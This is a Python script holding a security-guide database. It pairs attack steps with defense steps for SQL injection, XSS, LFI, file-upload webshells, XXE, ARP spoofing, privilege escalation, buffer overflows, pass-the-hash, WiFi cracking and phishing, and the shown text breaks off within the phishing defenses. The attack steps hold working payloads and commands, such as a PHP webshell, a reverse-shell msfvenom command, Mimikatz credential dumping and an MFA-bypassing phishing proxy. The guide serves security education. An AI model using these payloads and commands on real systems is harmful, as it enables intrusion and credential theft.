#!/usr/bin/env python3
"""
Project 101 - Offensive & Defensive Security Guide by SNXXIII
Step-by-step attack and defense techniques for security professionals.
For authorized security research, pentesting, and education only.
"""

import sys
import argparse

# Colors
GREEN   = '\033[92m'
CYAN    = '\033[96m'
RED     = '\033[91m'
YELLOW  = '\033[93m'
MAGENTA = '\033[95m'
BLUE    = '\033[94m'
RESET   = '\033[0m'
BOLD    = '\033[1m'
DIM     = '\033[2m'

BANNER = r"""
██████╗ ██████╗  ██████╗      ██╗███████╗ ██████╗████████╗   ██╗ ██████╗  ██╗
██╔══██╗██╔══██╗██╔═══██╗     ██║██╔════╝██╔════╝╚══██╔══╝  ███║██╔═████╗███║
██████╔╝██████╔╝██║   ██║     ██║█████╗  ██║        ██║     ╚██║██║██╔██║╚██║
██╔═══╝ ██╔══██╗██║   ██║██   ██║██╔══╝  ██║        ██║      ██║████╔╝██║ ██║
██║     ██║  ██║╚██████╔╝╚█████╔╝███████╗╚██████╗   ██║      ██║╚██████╔╝ ██║
╚═╝     ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚══════╝ ╚═════╝   ╚═╝      ╚═╝ ╚═════╝  ╚═╝
"""

# ─────────────────────────────────────────────────────────────────────────────
# TECHNIQUE DATABASE
# Each entry: name, aliases, category, risk, tools, cve_examples,
#             attack_steps, defense_steps
# ─────────────────────────────────────────────────────────────────────────────
TECHNIQUES = [
    # ── WEB ──────────────────────────────────────────────────────────────────
    {
        "name": "SQL Injection",
        "aliases": ["sql", "sqli", "sql injection", "break sql", "quotes", "database injection",
                    "inject sql", "union select", "break database", "login bypass sql"],
        "category": "Web",
        "risk": "CRITICAL",
        "tools": ["sqlmap", "Burp Suite", "Havij", "manual payloads"],
        "cve_examples": ["CVE-2012-1823", "CVE-2019-1543", "CVE-2021-22054"],
        "attack_steps": [
            "Identify input fields that interact with a database (login forms, search bars, URL params).",
            "Test for vulnerability: enter a single quote (') and observe errors or behavior changes.",
            "Determine DB type from error messages (MySQL, MSSQL, PostgreSQL, Oracle).",
            "Use UNION-based injection to extract column count: ' ORDER BY 1-- , ' ORDER BY 2--",
            "Extract DB name: ' UNION SELECT null, database()--",
            "Dump tables: ' UNION SELECT null, table_name FROM information_schema.tables--",
            "Extract columns and data: ' UNION SELECT username, password FROM users--",
            "Attempt blind SQLi if no output: use time-based (SLEEP(5)) or boolean-based payloads.",
            "Crack hashed passwords from extracted data using hashcat or john.",
            "Escalate: attempt file read (LOAD_FILE) or write webshell (INTO OUTFILE).",
        ],
        "defense_steps": [
            "Use parameterized queries / prepared statements — NEVER concatenate user input into SQL.",
            "Apply an ORM (SQLAlchemy, Hibernate, Entity Framework) to abstract raw queries.",
            "Validate and sanitize all input: whitelist expected characters, reject unexpected ones.",
            "Apply principle of least privilege: DB user should only have SELECT/INSERT, not DROP/FILE.",
            "Enable a Web Application Firewall (WAF) to detect and block SQL injection patterns.",
            "Suppress verbose database error messages in production — log them server-side only.",
            "Hash passwords using bcrypt/argon2 so extracted hashes are hard to crack.",
            "Use stored procedures where possible instead of dynamic queries.",
            "Regularly run automated SQLi scans (sqlmap --forms) against your own app.",
            "Monitor DB query logs for unusual patterns (UNION, SLEEP, information_schema).",
        ],
    },
    {
        "name": "Cross-Site Scripting (XSS)",
        "aliases": ["xss", "cross site scripting", "script injection", "inject script",
                    "reflected xss", "stored xss", "dom xss", "javascript injection"],
        "category": "Web",
        "risk": "HIGH",
        "tools": ["Burp Suite", "XSSer", "BeEF", "browser dev tools"],
        "cve_examples": ["CVE-2021-34473", "CVE-2020-11022"],
        "attack_steps": [
            "Find input fields that reflect output to the browser (search, comments, profile fields).",
            "Test basic payload: <script>alert(1)</script> — observe if it executes.",
            "If filtered, try bypass variants: <img src=x onerror=alert(1)>, <svg onload=alert(1)>.",
            "For stored XSS: inject payload in persistent fields (comments, usernames, bio).",
            "For DOM XSS: inspect JavaScript that reads URL fragments (#) or document.write().",
            "Escalate: steal session cookies via document.cookie and send to attacker server.",
            "Use BeEF to hook the victim browser and perform further exploitation.",
            "Inject keyloggers or redirect victims to phishing pages.",
            "Bypass CSP: look for unsafe-inline, JSONP endpoints, or CDN whitelisting misconfigs.",
            "Automate with XSSer to scan all input vectors.",
        ],
        "defense_steps": [
            "Encode all output: HTML-encode user-controlled data before rendering (& → &amp; etc.).",
            "Implement a strict Content Security Policy (CSP) header to block inline scripts.",
            "Use modern frameworks (React, Angular, Vue) that auto-escape output by default.",
            "Set HttpOnly and Secure flags on session cookies to prevent JS access.",
            "Validate and sanitize input server-side — reject or strip HTML tags where not needed.",
            "Use DOMPurify for sanitizing HTML if rich text input is required.",
            "Apply X-XSS-Protection and X-Content-Type-Options headers.",
            "Avoid innerHTML, document.write, eval() — use textContent instead.",
            "Conduct regular code reviews focusing on output rendering logic.",
            "Run automated scanners (Burp Suite, OWASP ZAP) on every deployment.",
        ],
    },
    {
        "name": "Cross-Site Request Forgery (CSRF)",
        "aliases": ["csrf", "cross site request forgery", "forged request", "request forgery"],
        "category": "Web",
        "risk": "HIGH",
        "tools": ["Burp Suite", "custom HTML forms", "curl"],
        "cve_examples": ["CVE-2020-11033", "CVE-2019-10086"],
        "attack_steps": [
            "Identify state-changing requests (fund transfer, password change, account delete).",
            "Verify the request lacks a CSRF token or uses a predictable one.",
            "Craft a malicious HTML page that auto-submits the request when visited.",
            "Host the page and trick the victim into visiting it while logged into the target.",
            "The victim's browser sends the request with their session cookie — action executes.",
            "For JSON APIs: check if CORS is misconfigured allowing cross-origin reads.",
            "Use Burp Suite's CSRF PoC generator to quickly build attack pages.",
            "Test SameSite cookie attribute absence — Lax/None cookies are more susceptible.",
        ],
        "defense_steps": [
            "Implement CSRF tokens: unique, unpredictable values tied to each user session.",
            "Validate the token server-side on every state-changing request.",
            "Set SameSite=Strict or SameSite=Lax on session cookies.",
            "Check the Origin and Referer headers server-side for sensitive actions.",
            "Use the Double Submit Cookie pattern as an alternative token approach.",
            "Require re-authentication for critical actions (password change, fund transfer).",
            "Avoid GET requests for state-changing operations.",
            "Modern frameworks (Django, Rails, Laravel) have built-in CSRF protection — enable it.",
        ],
    },
    {
        "name": "Server-Side Request Forgery (SSRF)",
        "aliases": ["ssrf", "server side request forgery", "internal request", "fetch internal",
                    "access internal", "cloud metadata"],
        "category": "Web",
        "risk": "CRITICAL",
        "tools": ["Burp Suite", "curl", "SSRFmap", "Gopherus"],
        "cve_examples": ["CVE-2021-26855", "CVE-2019-11043"],
        "attack_steps": [
            "Find features that fetch remote URLs (image upload from URL, webhooks, PDF generators).",
            "Replace external URL with internal: http://127.0.0.1/, http://localhost:8080/admin.",
            "Enumerate internal services: try common ports (22, 3306, 6379, 8080, 9200).",
            "Access cloud metadata: http://169.254.169.254/latest/meta-data/ (AWS).",
            "Retrieve IAM credentials from metadata endpoint.",
            "Use Gopher protocol to interact with Redis, memcached, or SMTP internally.",
            "Bypass filters: use decimal IP (2130706433 = 127.0.0.1), IPv6 (::1), URL encoding.",
            "Escalate to RCE via Redis or internal services that trust localhost.",
        ],
        "defense_steps": [
            "Validate and whitelist allowed URLs/domains — deny everything not on the list.",
            "Block requests to private IP ranges (10.x, 172.16.x, 192.168.x, 127.x, 169.254.x).",
            "Use a dedicated egress proxy that enforces URL allowlists.",
            "Disable unused URL schemes (file://, gopher://, dict://).",
            "In cloud environments, use IMDSv2 (AWS) which requires session-oriented tokens.",
            "Apply network segmentation — backend services should not be reachable from app tier.",
            "Log and alert on outbound requests to unexpected destinations.",
            "Do not expose raw error messages that reveal internal IP addresses.",
        ],
    },
    {
        "name": "Local File Inclusion (LFI)",
        "aliases": ["lfi", "local file inclusion", "file inclusion", "read files", "path traversal",
                    "directory traversal", "dot dot slash", "../", "read system files"],
        "category": "Web",
        "risk": "HIGH",
        "tools": ["Burp Suite", "LFISuite", "curl", "wfuzz"],
        "cve_examples": ["CVE-2021-41773", "CVE-2020-11975"],
        "attack_steps": [
            "Find parameters that include file paths: ?page=home, ?file=report, ?lang=en.",
            "Test traversal: ?page=../../../../etc/passwd",
            "Try URL encoding: %2e%2e%2f%2e%2e%2fetc/passwd",
            "Read sensitive files: /etc/passwd, /etc/shadow, /proc/self/environ, config files.",
            "Include log files that contain injected PHP (log poisoning for RCE).",
            "Inject PHP in User-Agent, then include access.log: ?page=../../../../var/log/apache2/access.log",
            "Use PHP wrappers: ?page=php://filter/convert.base64-encode/resource=index.php",
            "Escalate to RCE via /proc/self/fd or session file inclusion.",
        ],
        "defense_steps": [
            "Never pass user input directly to file system functions (include, require, fopen).",
            "Use a whitelist of allowed file names — map user input to internal identifiers.",
            "Disable allow_url_include and allow_url_fopen in PHP configuration.",
            "Chroot or containerize the application to limit file system access.",
            "Set open_basedir in PHP to restrict accessible directories.",
            "Apply proper file permissions — web server user should not read sensitive files.",
            "Use a WAF rule to detect and block traversal patterns.",
            "Regularly audit code for dynamic file inclusion patterns.",
        ],
    },
    {
        "name": "Unrestricted File Upload",
        "aliases": ["file upload", "upload shell", "webshell", "upload bypass", "malicious upload",
                    "upload php", "upload exploit"],
        "category": "Web",
        "risk": "CRITICAL",
        "tools": ["Burp Suite", "Weevely", "custom webshells", "curl"],
        "cve_examples": ["CVE-2020-25213", "CVE-2021-24145"],
        "attack_steps": [
            "Find file upload features (profile picture, document upload, attachment).",
            "Upload a PHP webshell (<?php system($_GET['cmd']); ?>) with .php extension.",
            "If blocked by extension, try: .php5, .phtml, .pHp, .php.jpg (double extension).",
            "Bypass MIME type check: change Content-Type to image/jpeg in Burp.",
            "If server checks magic bytes, prepend GIF89a; to the shell payload.",
            "Find the uploaded file location and browse to it in the browser.",
            "Execute OS commands via the webshell: ?cmd=whoami, ?cmd=cat /etc/passwd.",
            "Upgrade to reverse shell for interactive access.",
            "Escalate privileges using local exploits once shell is obtained.",
        ],
        "defense_steps": [
            "Whitelist allowed file extensions — reject everything not explicitly permitted.",
            "Validate MIME type server-side using magic bytes, not just Content-Type header.",
            "Rename uploaded files to random names with safe extensions.",
            "Store uploads outside the web root so they cannot be executed via URL.",
            "Serve files through a download script that sets correct Content-Disposition.",
            "Disable script execution in upload directories via server config.",
            "Scan uploaded files with antivirus/malware detection before storing.",
            "Limit upload file size and rate to prevent abuse.",
        ],
    },
    {
        "name": "Broken Authentication",
        "aliases": ["broken auth", "auth bypass", "login bypass", "bypass login", "weak auth",
                    "bypass authentication", "no password", "skip authentication", "default creds",
                    "default credentials", "weak password"],
        "category": "Web",
        "risk": "CRITICAL",
        "tools": ["Burp Suite", "Hydra", "Medusa", "curl", "custom scripts"],
        "cve_examples": ["CVE-2020-1938", "CVE-2019-2725"],
        "attack_steps": [
            "Test for default credentials: admin/admin, admin/password, root/root.",
            "Perform brute force on login with Hydra using common wordlists (rockyou.txt).",
            "Check for username enumeration via different error messages.",
            "Test account lockout — if absent, brute force without limit.",
            "Intercept login with Burp, try SQL injection in username field.",
            "Check 'Remember Me' token — if predictable, forge it.",
            "Test password reset flow: guess reset tokens, check for token reuse.",
            "Look for session tokens in URLs (logged in server access logs).",
            "Test JWT: decode token, change role to admin, try none algorithm attack.",
            "Check if session is invalidated after logout.",
        ],
        "defense_steps": [
            "Enforce strong password policy: minimum length, complexity, no common passwords.",
            "Implement multi-factor authentication (MFA/2FA) on all accounts.",
            "Rate-limit login attempts and implement account lockout after N failures.",
            "Use generic error messages — 'Invalid credentials' not 'User not found'.",
            "Invalidate sessions properly on logout and implement session timeouts.",
            "Use secure, random session tokens — never predictable or sequential.",
            "Implement secure password reset: short-lived, single-use tokens sent to verified email.",
            "Hash passwords with bcrypt, scrypt, or Argon2 (never MD5 or plain SHA).",
            "Sign and validate JWTs properly — reject 'none' algorithm.",
            "Log all authentication events and alert on anomalies.",
        ],
    },
    {
        "name": "Insecure Direct Object Reference (IDOR)",
        "aliases": ["idor", "insecure direct object reference", "access other users",
                    "change user id", "horizontal privilege", "access another account"],
        "category": "Web",
        "risk": "HIGH",
        "tools": ["Burp Suite", "curl", "browser dev tools"],
        "cve_examples": ["CVE-2021-27905", "CVE-2020-9484"],
        "attack_steps": [
            "Find requests that reference objects by ID: /api/user/1001/profile, /invoice/5523.",
            "Increment or modify the ID: /api/user/1002/profile — does it return another user's data?",
            "Try accessing admin objects: /api/user/1/settings.",
            "Test GUIDs: if sequential or predictable, enumerate them.",
            "Check POST body parameters for object references that can be tampered.",
            "Test indirect references in cookies or hidden form fields.",
            "Combine with privilege escalation: access + modify other user records.",
            "Test API endpoints separately — frontend may hide buttons but API still accepts requests.",
        ],
        "defense_steps": [
            "Enforce authorization checks on every object access — verify ownership server-side.",
            "Use indirect references: map session-specific tokens to actual IDs internally.",
            "Use UUIDs instead of sequential integers to reduce guessability.",
            "Apply role-based access control (RBAC) consistently across all endpoints.",
            "Never trust client-supplied IDs without verifying the requesting user owns them.",
            "Log all object access and flag anomalies (user accessing many different IDs rapidly).",
            "Conduct access control testing as part of every code review and security audit.",
        ],
    },
    {
        "name": "XML External Entity (XXE)",
        "aliases": ["xxe", "xml external entity", "xml injection", "xml entity", "xml attack"],
        "category": "Web",
        "risk": "HIGH",
        "tools": ["Burp Suite", "XXEinjector", "curl"],
        "cve_examples": ["CVE-2021-40438", "CVE-2019-3799"],
        "attack_steps": [
            "Find features that parse XML: file upload (docx, xlsx, svg), API endpoints.",
            "Inject external entity definition in XML: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>.",
            "Reference the entity in XML body: <name>&xxe;</name>.",
            "Read sensitive files: /etc/passwd, /etc/shadow, application config files.",
            "Use SSRF via XXE: <!ENTITY xxe SYSTEM 'http://internal-server/'>.",
            "Try blind XXE with out-of-band exfiltration using a DNS/HTTP callback server.",
            "Use error-based XXE if output is not reflected directly.",
            "Escalate to RCE via expect:// wrapper in PHP environments.",
        ],
        "defense_steps": [
            "Disable external entity processing in XML parsers — set features to disallow DOCTYPE.",
            "Use JSON instead of XML where possible.",
            "Update XML parsing libraries to patched versions.",
            "Validate and sanitize XML input before parsing.",
            "Use allowlists for XML schemas and reject unexpected elements.",
            "Apply WAF rules to detect XXE patterns in requests.",
            "Run applications with minimal file system permissions.",
        ],
    },

    # ── NETWORK ──────────────────────────────────────────────────────────────
    {
        "name": "Man-in-the-Middle (MITM)",
        "aliases": ["mitm", "man in the middle", "arp spoof", "arp poisoning", "intercept traffic",
                    "sniff traffic", "network interception", "ssl strip"],
        "category": "Network",
        "risk": "HIGH",
        "tools": ["Ettercap", "Bettercap", "Wireshark", "MITMf", "arpspoof"],
        "cve_examples": ["CVE-2014-3566 (POODLE)", "CVE-2009-3555 (TLS Renegotiation)"],
        "attack_steps": [
            "Connect to the same network as the target.",
            "Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward.",
            "Perform ARP spoofing: arpspoof -i eth0 -t <victim_ip> <gateway_ip>.",
            "Simultaneously spoof gateway: arpspoof -i eth0 -t <gateway_ip> <victim_ip>.",
            "Capture traffic with Wireshark or tcpdump — filter by victim IP.",
            "Use Bettercap for automated MITM with modules (ARP, DNS, HTTP proxy).",
            "Strip HTTPS with SSLstrip to downgrade to HTTP and capture credentials.",
            "Inject malicious content into HTTP responses.",
            "Perform DNS spoofing to redirect victim to fake sites.",
            "Capture NTLM hashes on Windows networks using Responder.",
        ],
        "defense_steps": [
            "Use Dynamic ARP Inspection (DAI) on managed switches to prevent ARP spoofing.",
            "Enable HTTPS everywhere — use HSTS to prevent SSL stripping.",
            "Use certificate pinning in mobile and desktop applications.",
            "Deploy 802.1X network authentication to prevent unauthorized devices.",
            "Use VPN or encrypted tunnels for sensitive communications.",
            "Monitor ARP tables for unexpected changes — alert on ARP poisoning.",
            "Use static ARP entries for critical systems.",
            "Enable MFA so stolen credentials alone are not enough.",
            "Segment networks to limit blast radius of a MITM attack.",
            "Use encrypted protocols (TLS 1.3, SSH, SFTP) instead of plaintext ones.",
        ],
    },
    {
        "name": "Port Scanning & Enumeration",
        "aliases": ["port scan", "enumeration", "network scan", "service scan", "nmap scan",
                    "discover services", "fingerprint services", "open ports"],
        "category": "Network",
        "risk": "LOW",
        "tools": ["Nmap", "Masscan", "Netcat", "Unicornscan"],
        "cve_examples": [],
        "attack_steps": [
            "Identify target IP range to scan.",
            "Ping sweep to find live hosts: nmap -sn 192.168.1.0/24.",
            "SYN scan for open ports: nmap -sS -p- <target>.",
            "Service & version detection: nmap -sV -sC <target>.",
            "OS fingerprinting: nmap -O <target>.",
            "Aggressive scan for all info: nmap -A <target>.",
            "Fast scan with Masscan: masscan -p1-65535 <target> --rate=1000.",
            "Banner grab with Netcat: nc -nv <target> <port>.",
            "Use Nmap scripts for specific service enumeration (smb-enum-shares, http-title).",
            "Document all open ports, services, and versions for vulnerability research.",
        ],
        "defense_steps": [
            "Close all unnecessary ports — apply principle of minimal exposure.",
            "Use a firewall to restrict access to services by IP and port.",
            "Deploy an IDS/IPS (Snort, Suricata) to detect and alert on port scans.",
            "Change default service ports where feasible (non-standard SSH port).",
            "Use port knocking or single-packet authentication for sensitive services.",
            "Disable banners and version info in service configurations.",
            "Monitor network logs for systematic scanning patterns.",
            "Segment networks so internal services are not reachable externally.",
        ],
    },
    {
        "name": "DNS Poisoning",
        "aliases": ["dns poison", "dns spoofing", "dns attack", "dns hijack", "dns cache poisoning"],
        "category": "Network",
        "risk": "HIGH",
        "tools": ["dnsspoof", "Bettercap", "Ettercap", "custom scripts"],
        "cve_examples": ["CVE-2008-1447 (Kaminsky attack)", "CVE-2020-25705"],
        "attack_steps": [
            "Position as MITM on the network (ARP spoofing first).",
            "Use dnsspoof to intercept and forge DNS responses.",
            "Map target domain to attacker-controlled IP in forged response.",
            "Victim's DNS cache stores the poisoned entry.",
            "All requests to the domain now go to attacker's server.",
            "Host a clone of the target site to harvest credentials.",
            "For cache poisoning: send rapid forged responses to DNS resolver with guessed TXIDs.",
            "Use Bettercap dns.spoof module for automated DNS hijacking.",
        ],
        "defense_steps": [
            "Enable DNSSEC — cryptographically signs DNS records to prevent tampering.",
            "Use DNS over HTTPS (DoH) or DNS over TLS (DoT) for encrypted DNS queries.",
            "Use reputable DNS resolvers with built-in security (Cloudflare 1.1.1.1, Google 8.8.8.8).",
            "Randomize source ports and transaction IDs in DNS resolver.",
            "Implement short TTLs on critical DNS records to limit cache poisoning window.",
            "Monitor DNS traffic for unexpected changes in record resolution.",
            "Use network segmentation to limit which hosts can perform DNS queries.",
        ],
    },
    {
        "name": "Packet Sniffing",
        "aliases": ["sniff", "packet capture", "network capture", "wireshark", "tcpdump",
                    "capture packets", "traffic analysis", "credential sniffing"],
        "category": "Network",
        "risk": "MEDIUM",
        "tools": ["Wireshark", "tcpdump", "tshark", "Ettercap", "Dsniff"],
        "cve_examples": [],
        "attack_steps": [
            "Connect to target network (wired or wireless).",
            "Set interface to promiscuous mode: ip link set eth0 promisc on.",
            "Capture traffic: tcpdump -i eth0 -w capture.pcap.",
            "Open capture in Wireshark — apply filters (http, ftp, telnet).",
            "Extract credentials from plaintext protocols (FTP, Telnet, HTTP Basic Auth).",
            "Use dsniff to automatically extract credentials from capture.",
            "Analyze captured traffic for sensitive data, session tokens, API keys.",
            "Combine with ARP spoofing to capture switched network traffic.",
        ],
        "defense_steps": [
            "Encrypt all communications — TLS for web, SSH for remote access, SFTP for file transfer.",
            "Never use plaintext protocols (FTP, Telnet, HTTP) for sensitive data.",
            "Use network switches instead of hubs to limit broadcast traffic.",
            "Enable port security on switches to prevent unauthorized devices.",
            "Use VLANs to segment network traffic by department or sensitivity.",
            "Deploy network monitoring to detect promiscuous mode interfaces (ARPwatch).",
            "Use encrypted messaging and VPNs on untrusted networks.",
        ],
    },

    # ── SYSTEM ───────────────────────────────────────────────────────────────
    {
        "name": "Privilege Escalation (Linux)",
        "aliases": ["privilege escalation", "privesc", "priv esc", "linux privesc",
                    "escalate privileges", "become root", "get root", "linux root"],
        "category": "System",
        "risk": "CRITICAL",
        "tools": ["LinPEAS", "LinEnum", "GTFOBins", "pspy", "exploit-db"],
        "cve_examples": ["CVE-2021-4034 (PwnKit)", "CVE-2021-3560", "CVE-2016-5195 (DirtyCow)"],
        "attack_steps": [
            "Run LinPEAS to automatically enumerate privilege escalation vectors.",
            "Check SUID binaries: find / -perm -4000 -type f 2>/dev/null.",
            "Look up SUID binaries on GTFOBins for exploitation techniques.",
            "Check sudo permissions: sudo -l — look for NOPASSWD entries.",
            "Check writable cron jobs: cat /etc/crontab, ls -la /etc/cron.*.",
            "Look for weak file permissions on sensitive files (/etc/passwd, /etc/shadow).",
            "Search for credentials in config files, history, environment variables.",
            "Check running processes for root processes with exploitable services.",
            "Look for kernel version and search for local kernel exploits.",
            "Check NFS shares: cat /etc/exports — no_root_squash is exploitable.",
        ],
        "defense_steps": [
            "Apply principle of least privilege — users should only have necessary permissions.",
            "Audit and minimize SUID/SGID binaries: remove unnecessary ones.",
            "Regularly patch the OS kernel and installed packages.",
            "Review sudoers file — avoid NOPASSWD and wildcard commands.",
            "Secure cron jobs: ensure scripts run by cron are not world-writable.",
            "Use mandatory access control (SELinux, AppArmor) to confine processes.",
            "Store credentials securely — use vaults (HashiCorp Vault) not plaintext files.",
            "Monitor for suspicious privilege changes with auditd.",
            "Run services as non-root users with minimal permissions.",
            "Use rootkit scanners (rkhunter, chkrootkit) regularly.",
        ],
    },
    {
        "name": "Privilege Escalation (Windows)",
        "aliases": ["windows privesc", "windows privilege escalation", "windows escalation",
                    "become admin windows", "windows root", "uac bypass"],
        "category": "System",
        "risk": "CRITICAL",
        "tools": ["WinPEAS", "PowerUp", "Metasploit", "BeRoot", "accesschk"],
        "cve_examples": ["CVE-2021-36934 (HiveNightmare)", "CVE-2020-1472 (Zerologon)"],
        "attack_steps": [
            "Run WinPEAS or PowerUp to enumerate escalation vectors.",
            "Check weak service permissions: sc qc <service>, accesschk.exe -uwcqv *.",
            "Look for unquoted service paths: wmic service get name,displayname,pathname.",
            "Check always-install-elevated GPO: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer.",
            "Look for stored credentials: cmdkey /list, credential manager, SAM database.",
            "Check DLL hijacking opportunities in PATH directories.",
            "Exploit misconfigured scheduled tasks with weak permissions.",
            "Dump LSASS memory for credentials: procdump -ma lsass.exe or Mimikatz.",
            "Pass-the-hash using extracted NTLM hashes.",
            "Use token impersonation with tools like Juicy Potato or PrintSpoofer.",
        ],
        "defense_steps": [
            "Keep Windows and all software fully patched.",
            "Apply principle of least privilege — avoid local admin accounts for daily use.",
            "Quote all service paths that contain spaces.",
            "Restrict service permissions — only SYSTEM/Administrators should modify services.",
            "Enable Credential Guard to protect LSASS from credential dumping.",
            "Enable Protected Users group for privileged accounts.",
            "Disable NTLM where possible — use Kerberos.",
            "Enable UAC at highest level and require admin approval for installations.",
            "Use LAPS (Local Administrator Password Solution) for unique local admin passwords.",
            "Monitor for Mimikatz and credential dumping indicators (event ID 4625, 4648).",
        ],
    },
    {
        "name": "Buffer Overflow",
        "aliases": ["buffer overflow", "bof", "overflow", "stack overflow", "heap overflow",
                    "memory corruption", "stack smashing"],
        "category": "System",
        "risk": "CRITICAL",
        "tools": ["GDB", "pwndbg", "pwntools", "Immunity Debugger", "mona.py", "ROPgadget"],
        "cve_examples": ["CVE-2021-3156 (sudo heap overflow)", "CVE-2000-0884"],
        "attack_steps": [
            "Identify the vulnerable application and its input vectors.",
            "Fuzz the input with increasing lengths to find crash point.",
            "Use pattern_create to generate unique pattern and find EIP/RIP offset.",
            "Verify control of EIP/RIP by sending A's * offset + BBBB.",
            "Identify bad characters that truncate the payload.",
            "Find a JMP ESP/RET gadget using mona.py or ROPgadget.",
            "Generate shellcode: msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f c.",
            "Build exploit: padding + JMP ESP address + NOP sled + shellcode.",
            "Test exploit and catch reverse shell.",
            "For modern systems with ASLR/NX: build ROP chain to bypass mitigations.",
        ],
        "defense_steps": [
            "Use memory-safe languages (Rust, Go) where possible.",
            "Enable stack canaries (SSP) to detect stack smashing at runtime.",
            "Enable ASLR (Address Space Layout Randomization) at OS level.",
            "Enable NX/DEP (Non-Executable stack/heap) to prevent shellcode execution.",
            "Enable PIE (Position Independent Executable) in compiler flags.",
            "Use safe C functions: strncpy instead of strcpy, snprintf instead of sprintf.",
            "Apply bounds checking and input validation rigorously.",
            "Use fuzzing in CI/CD pipeline to catch overflow vulnerabilities early.",
            "Enable Control Flow Integrity (CFI) in modern compilers.",
            "Regularly audit C/C++ code for unsafe memory operations.",
        ],
    },
    {
        "name": "Pass-the-Hash",
        "aliases": ["pass the hash", "pth", "hash attack", "ntlm hash", "credential reuse",
                    "lateral movement hash"],
        "category": "System",
        "risk": "CRITICAL",
        "tools": ["Mimikatz", "CrackMapExec", "Impacket", "Metasploit"],
        "cve_examples": ["CVE-2017-0144 (EternalBlue)", "CVE-2020-1472 (Zerologon)"],
        "attack_steps": [
            "Gain initial access to a Windows machine (any privilege level).",
            "Dump NTLM hashes from SAM or LSASS using Mimikatz: sekurlsa::logonpasswords.",
            "Identify target machines where the same account exists.",
            "Use CrackMapExec: cme smb <target> -u administrator -H <ntlm_hash>.",
            "Or use Impacket's psexec: psexec.py administrator@<target> -hashes :<ntlm_hash>.",
            "Execute commands or get shell on the target without cracking the password.",
            "Dump more hashes from newly compromised machines — repeat for lateral movement.",
            "Target Domain Controller to escalate to Domain Admin.",
        ],
        "defense_steps": [
            "Enable Credential Guard to prevent LSASS memory dumping.",
            "Disable NTLM authentication where Kerberos can be used.",
            "Use Protected Users group — members cannot authenticate with NTLM.",
            "Enable Windows Defender Credential Guard.",
            "Implement network segmentation to limit lateral movement.",
            "Use LAPS to ensure unique local admin passwords per machine.",
            "Monitor for event ID 4624 (logon type 3) anomalies.",
            "Limit privileged account use — separate accounts for admin tasks.",
            "Deploy Privileged Access Workstations (PAW) for admin activities.",
        ],
    },

    # ── WIRELESS ─────────────────────────────────────────────────────────────
    {
        "name": "WPA2 Password Cracking",
        "aliases": ["wpa2", "wifi crack", "wifi password", "crack wifi", "wireless crack",
                    "handshake capture", "wpa crack", "break wifi"],
        "category": "Wireless",
        "risk": "HIGH",
        "tools": ["Aircrack-ng", "Hashcat", "hcxdumptool", "Wireshark"],
        "cve_examples": ["CVE-2017-13077 (KRACK)"],
        "attack_steps": [
            "Set wireless interface to monitor mode: airmon-ng start wlan0.",
            "Scan for networks: airodump-ng wlan0mon.",
            "Target a specific network: airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon.",
            "Capture WPA2 handshake by waiting for a client or deauthenticating one.",
            "Deauth attack: aireplay-ng -0 5 -a <BSSID> -c <client_MAC> wlan0mon.",
            "Verify handshake capture in airodump-ng output.",
            "Crack with dictionary: aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt.",
            "Or use Hashcat (faster): hashcat -m 22000 capture.hc22000 rockyou.txt.",
            "Try rule-based attacks: hashcat -m 22000 -r rules/best64.rule capture.hc22000 wordlist.txt.",
        ],
        "defense_steps": [
            "Use WPA3 where hardware supports it — resistant to offline dictionary attacks.",
            "Use a long, complex, random WiFi password (20+ characters).",
            "Avoid common words, names, or keyboard patterns in WiFi passwords.",
            "Enable 802.1X (Enterprise) authentication instead of Pre-Shared Key.",
            "Disable WPS — it is vulnerable to brute force regardless of password strength.",
            "Regularly rotate WiFi passwords, especially after personnel changes.",
            "Use a separate guest network for untrusted devices.",
            "Monitor for deauthentication attacks with wireless IDS.",
        ],
    },
    {
        "name": "Evil Twin Attack",
        "aliases": ["evil twin", "rogue ap", "fake wifi", "fake access point", "rogue access point",
                    "wifi phishing", "captive portal attack"],
        "category": "Wireless",
        "risk": "HIGH",
        "tools": ["hostapd-wpe", "airbase-ng", "Bettercap", "Wifiphisher"],
        "cve_examples": [],
        "attack_steps": [
            "Identify target network SSID and BSSID.",
            "Create a rogue AP with identical SSID: hostapd with matching network name.",
            "Broadcast with higher power to attract clients away from legitimate AP.",
            "Send deauth packets to disconnect clients from legitimate AP.",
            "Clients reconnect to evil twin — provide DHCP and internet via attacker machine.",
            "Launch captive portal to harvest WiFi password or credentials.",
            "Perform MITM on all traffic passing through the rogue AP.",
            "Use Wifiphisher for automated evil twin + credential harvesting.",
        ],
        "defense_steps": [
            "Use WPA3 with SAE — prevents credential harvesting via fake APs.",
            "Use 802.1X enterprise authentication — credentials are not reusable on rogue APs.",
            "Train users to verify the correct network before connecting.",
            "Use a VPN on all WiFi connections to encrypt traffic even through rogue APs.",
            "Deploy wireless intrusion detection to alert on rogue APs.",
            "Use certificate-based authentication so users notice certificate warnings on evil twins.",
            "Monitor for duplicate SSIDs with different BSSIDs on your network.",
        ],
    },

    # ── SOCIAL ENGINEERING ───────────────────────────────────────────────────
    {
        "name": "Phishing",
        "aliases": ["phishing", "spear phishing", "email phishing", "credential harvesting",
                    "fake email", "phish", "social engineering email", "fake login page"],
        "category": "Social Engineering",
        "risk": "HIGH",
        "tools": ["GoPhish", "SET (Social Engineering Toolkit)", "Evilginx2", "Modlishka"],
        "cve_examples": [],
        "attack_steps": [
            "Perform OSINT on the target: LinkedIn, company website, email format.",
            "Register a lookalike domain (company-support.com, cornpany.com).",
            "Clone the target login page using SET: setoolkit → Website Attack Vectors → Credential Harvester.",
            "Craft a convincing email with urgency (account suspended, security alert).",
            "Send phishing email using GoPhish campaign with tracking.",
            "Collect submitted credentials from GoPhish dashboard.",
            "Use Evilginx2 for real-time phishing proxy to bypass MFA.",
            "Use captured credentials to log in to real systems.",
            "Track click rates and credential submissions in campaign.",
        ],
        "defense_steps": [
            "Implement and enforce MFA — phished passwords alone become insufficient.",
            "Deploy email filtering (SPF, DKIM, DMARC) to block spoofed emails.",
            "Use anti-phishing browser extensions and safe browsing APIs.",
